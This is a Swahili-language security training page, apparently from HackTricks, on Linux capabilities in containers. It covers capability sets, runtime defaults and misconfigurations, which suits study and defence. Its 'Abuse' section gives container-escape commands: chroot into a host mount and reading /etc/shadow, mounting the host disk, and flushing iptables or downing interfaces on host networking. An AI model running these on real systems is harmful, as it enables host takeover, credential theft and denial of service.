# Capabilities za Linux Ndani ya Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux capabilities ni miongoni mwa vipengele muhimu zaidi vya container security kwa sababu yanajibu swali la msingi lakini lenye undani: **"root" inamaanisha nini hasa ndani ya container?** Kwenye mfumo wa kawaida wa Linux, UID 0 kihistoria ilimaanisha seti pana sana ya privileges. Kwenye kernels za kisasa, privilege hiyo imegawanywa katika vitengo vidogo vinavyoitwa capabilities. Process inaweza kuendeshwa kama root lakini bado ikakosa operations nyingi zenye nguvu ikiwa capabilities husika zimeondolewa.

Containers hutegemea sana tofauti hii. Workloads nyingi bado huzinduliwa kama UID 0 ndani ya container kwa sababu za compatibility au urahisi. Bila kuondoa capabilities, hilo lingekuwa hatari sana. Kwa kuondoa capabilities, root process iliyo ndani ya container bado inaweza kufanya tasks nyingi za kawaida ndani ya container huku ikizuiwa kufanya operations nyeti zaidi za kernel. Ndiyo maana container shell inayoonyesha `uid=0(root)` haimaanishi moja kwa moja "host root" au hata "broad kernel privilege". Capability sets huamua jinsi utambulisho huo wa root ulivyo na thamani kwa kweli.

Kwa reference kamili ya Linux capabilities na mifano mingi ya abuse, tazama:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uendeshaji

Capabilities hufuatiliwa katika sets kadhaa, zikiwemo permitted, effective, inheritable, ambient, na bounding sets. Kwa assessments nyingi za containers, semantics kamili za kernel za kila set si muhimu mara moja kama swali la vitendo: **ni operations zipi zenye privilege ambazo process hii inaweza kufanikiwa kufanya sasa hivi, na ni privilege gains zipi za baadaye ambazo bado zinawezekana?**

Sababu ya umuhimu huu ni kwamba breakout techniques nyingi kwa kweli ni matatizo ya capabilities yaliyojificha kama matatizo ya containers. Workload yenye `CAP_SYS_ADMIN` inaweza kufikia kiasi kikubwa cha kernel functionality ambacho container root process ya kawaida haipaswi kugusa. Workload yenye `CAP_NET_ADMIN` inakuwa hatari zaidi ikiwa pia inashiriki host network namespace. Workload yenye `CAP_SYS_PTRACE` inakuwa ya kuvutia zaidi ikiwa inaweza kuona host processes kupitia host PID sharing. Katika Docker au Podman hilo linaweza kuonekana kama `--pid=host`; katika Kubernetes kwa kawaida huonekana kama `hostPID: true`.

Kwa maneno mengine, capability set haiwezi kutathminiwa ikiwa peke yake. Inapaswa kusomwa pamoja na namespaces, seccomp, na MAC policy.

## Maabara

Njia ya moja kwa moja sana ya kukagua capabilities ndani ya container ni:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Unaweza pia kulinganisha container yenye vizuizi zaidi na ile iliyo na capabilities zote zilizoongezwa:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ili kuona athari ya nyongeza mahususi, jaribu kuondoa kila kitu na kuongeza tena uwezo mmoja tu:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Majaribio haya madogo husaidia kuonyesha kwamba runtime haibadilishi tu boolean inayoitwa "privileged". Inaunda privilege surface halisi inayopatikana kwa process.

## Capabilities zenye Hatari Kuu

Ingawa capabilities nyingi zinaweza kuwa muhimu kulingana na target, chache huhusika mara kwa mara katika uchanganuzi wa container escape.

**`CAP_SYS_ADMIN`** ndiyo ambayo defenders wanapaswa kuitilia shaka zaidi. Mara nyingi huelezwa kama "the new root" kwa sababu hufungua kiasi kikubwa cha functionality, ikiwemo operations zinazohusiana na mount, tabia inayotegemea namespace, na kernel paths nyingi ambazo hazipaswi kamwe kufichuliwa kwa containers kiholela. Ikiwa container ina `CAP_SYS_ADMIN`, seccomp dhaifu, na haina MAC confinement imara, classic breakout paths nyingi huwa halisi zaidi.

**`CAP_SYS_PTRACE`** ni muhimu wakati process visibility ipo, hasa ikiwa PID namespace inashirikiwa na host au workloads jirani yenye kuvutia. Inaweza kubadilisha visibility kuwa tampering.

**`CAP_NET_ADMIN`** na **`CAP_NET_RAW`** ni muhimu katika mazingira yanayolenga network. Kwenye isolated bridge network, zinaweza tayari kuwa hatari; kwenye shared host network namespace huwa mbaya zaidi kwa sababu workload inaweza kuweza kureconfigure host networking, kusniff, kuspoof, au kuingilia local traffic flows.

**`CAP_SYS_MODULE`** kwa kawaida ni janga katika mazingira ya rootful kwa sababu kupakia kernel modules ni sawa kivitendo na kudhibiti host-kernel. Karibu kamwe haipaswi kuwepo kwenye general-purpose container workload.

## Matumizi ya Runtime

Docker, Podman, containerd-based stacks, na CRI-O zote hutumia capability controls, lakini defaults na management interfaces hutofautiana. Docker huzionyesha moja kwa moja kupitia flags kama `--cap-drop` na `--cap-add`. Podman hutoa controls zinazofanana na mara nyingi hunufaika na rootless execution kama safety layer ya ziada. Kubernetes huonyesha capability additions na drops kupitia `securityContext` ya Pod au container. System-container environments kama LXC/Incus pia hutegemea capability control, lakini host integration pana ya systems hizo mara nyingi huwafanya operators kulegeza defaults kwa nguvu zaidi kuliko ambavyo wangefanya katika app-container environment.

Kanuni hiyo hiyo inatumika kwa zote: capability ambayo inawezekana kitaalamu kupewa si lazima iwe capability inayopaswa kupewa. Incidents nyingi za ulimwengu halisi huanza wakati operator anaongeza capability kwa sababu tu workload ilishindwa kufanya kazi chini ya configuration kali zaidi na team ilihitaji quick fix.

## Misconfigurations

Kosa lililo wazi zaidi ni **`--cap-add=ALL`** katika Docker/Podman-style CLIs, lakini si hilo pekee. Kwa vitendo, tatizo linalotokea mara nyingi zaidi ni kutoa capabilities moja au mbili zenye nguvu sana, hasa `CAP_SYS_ADMIN`, ili "make the application work" bila pia kuelewa implications za namespace, seccomp, na mount. Failure mode nyingine ya kawaida ni kuchanganya capabilities za ziada na host namespace sharing. Katika Docker au Podman hii inaweza kuonekana kama `--pid=host`, `--network=host`, au `--userns=host`; katika Kubernetes, exposure inayolingana kwa kawaida huonekana kupitia workload settings kama `hostPID: true` au `hostNetwork: true`. Kila moja ya combinations hizo hubadilisha kile ambacho capability inaweza kuathiri kwa kweli.

Pia ni kawaida kuona administrators wakiamini kwamba kwa sababu workload si `--privileged` kikamilifu, bado ina vikwazo vya maana. Wakati mwingine hilo ni kweli, lakini wakati mwingine effective posture tayari iko karibu kiasi cha privileged hivi kwamba tofauti hiyo haijalishi tena operationally.

## Abuse

Hatua ya kwanza ya vitendo ni ku-enumerate effective capability set na mara moja ku-test capability-specific actions ambazo zingekuwa muhimu kwa escape au host information access:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ikiwa `CAP_SYS_ADMIN` ipo, kwanza jaribu matumizi mabaya yanayotegemea mount na ufikiaji wa filesystem ya host, kwa sababu hii ni mojawapo ya vichochezi vya kawaida vya breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ikiwa `CAP_SYS_PTRACE` ipo na container inaweza kuona processes zinazovutia, thibitisha ikiwa capability hiyo inaweza kutumika kufanya process inspection:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ikiwa `CAP_NET_ADMIN` au `CAP_NET_RAW` ipo, jaribu kubaini ikiwa workload inaweza kudhibiti network stack inayoonekana au angalau kukusanya network intelligence muhimu:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Jaribio la capability linapofaulu, liunganishe na hali ya namespace. Capability inayoonekana kuwa na hatari tu katika namespace iliyotengwa inaweza kuwa escape au host-recon primitive mara moja pale container inaposhiriki pia host PID, host network, au host mounts.

### Mfano Kamili: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ikiwa container ina `CAP_SYS_ADMIN` na writable bind mount ya host filesystem kama vile `/host`, escape path mara nyingi huwa ya moja kwa moja:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ikiwa `chroot` itafaulu, amri sasa zitatekelezwa katika muktadha wa `root filesystem` ya host:
```bash
id
hostname
cat /etc/shadow | head
```
Ikiwa `chroot` haipatikani, matokeo hayo hayo mara nyingi yanaweza kupatikana kwa kuita binary kupitia mti uliowekwa mount:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Mfano Kamili: `CAP_SYS_ADMIN` + Ufikiaji wa Kifaa

Ikiwa block device kutoka kwa host imewekwa wazi, `CAP_SYS_ADMIN` inaweza kuigeuza kuwa ufikiaji wa moja kwa moja wa mfumo wa faili wa host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Mfano Kamili: `CAP_NET_ADMIN` + Host Networking

Mchanganyiko huu hauzalishi kila mara host root moja kwa moja, lakini unaweza kusanidi upya kikamilifu network stack ya host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hilo linaweza kuwezesha denial of service, traffic interception, au access to services ambazo hapo awali zilikuwa zimechujwa.

## Ukaguzi

Lengo la capability checks si kutoa tu raw values, bali kuelewa ikiwa process ina privilege ya kutosha kufanya namespace na mount situation yake ya sasa iwe hatari.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Kinachovutia hapa:

- `capsh --print` ndiyo njia rahisi zaidi ya kubaini capabilities zenye hatari kubwa kama vile `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, au `cap_sys_module`.
- Mstari wa `CapEff` katika `/proc/self/status` unakuambia ni nini hasa kinachotumika sasa, si tu kile kinachoweza kupatikana katika sets nyingine.
- Capability dump huwa muhimu zaidi ikiwa container pia inashiriki host PID, network, au user namespaces, au ina host mounts zinazoweza kuandikwa.

Baada ya kukusanya taarifa ghafi za capabilities, hatua inayofuata ni kuzitafsiri. Jiulize ikiwa process ni root, ikiwa user namespaces ziko active, ikiwa host namespaces zinashirikiwa, ikiwa seccomp inatekelezwa, na ikiwa AppArmor au SELinux bado zinaizuia process. Capability set pekee ni sehemu moja tu ya picha nzima, lakini mara nyingi ndiyo sehemu inayoeleza kwa nini container breakout moja inafanya kazi na nyingine inashindwa ikiwa na starting point inayoonekana kuwa ileile.

## Misingi ya Runtime

| Runtime / platform | Hali ya kawaida | Tabia ya kawaida | Udhaifu wa kawaida unaowekwa manually |
| --- | --- | --- | --- |
| Docker Engine | Capability set iliyopunguzwa kwa kawaida | Docker huhifadhi allowlist ya kawaida ya capabilities na huondoa zilizobaki | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Capability set iliyopunguzwa kwa kawaida | Podman containers huwa unprivileged kwa kawaida na hutumia capability model iliyopunguzwa | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hurithi runtime defaults isipobadilishwa | Ikiwa hakuna `securityContext.capabilities` zilizobainishwa, container hupata default capability set kutoka kwa runtime | `securityContext.capabilities.add`, kushindwa kuweka `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Kwa kawaida runtime default | Set inayotumika hutegemea runtime pamoja na Pod spec | sawa na safu ya Kubernetes; direct OCI/CRI configuration inaweza pia kuongeza capabilities waziwazi |

Kwa Kubernetes, jambo muhimu ni kwamba API haibainishi default capability set moja ya jumla. Ikiwa Pod haiongezi wala kuondoa capabilities, workload hurithi runtime default ya node hiyo.

{{#include ../../../../banners/hacktricks-training.md}}
